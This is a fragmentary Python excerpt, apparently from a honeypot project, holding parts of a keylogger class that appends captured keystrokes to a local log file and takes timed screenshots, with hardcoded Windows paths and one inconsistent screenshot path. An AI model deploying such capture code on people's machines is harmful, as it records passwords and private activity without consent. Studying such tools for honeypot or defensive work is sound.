...
def write_file(keys):                  #To write the keys to the Files
    with open("C:/Users/allur/Downloads/Honeypot-Implementation-master/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
...
class keylogger_main:
    ...
    def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
        if not os.path.exists('C:/Users/allur/Downloads/Honeypot-Implementation-master/Keylogger'):
            os.mkdir('C:/Users/allur/Downloads/Honeypot-Implementation-master/Keylogger')
            os.mkdir('C:/Users/allur/Downloads/Honeypot-Implementation-master/Screenshots')
            os.mknod('C:/Users/allur/Downloads/Honeypot-Implementation-master/Keylogger/log.txt')
    ...
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='C:/Users/allur/Downloads/Honeypot-Implementation-masters//Keylogger/Screenshots/{}.png'.format(time.time()))
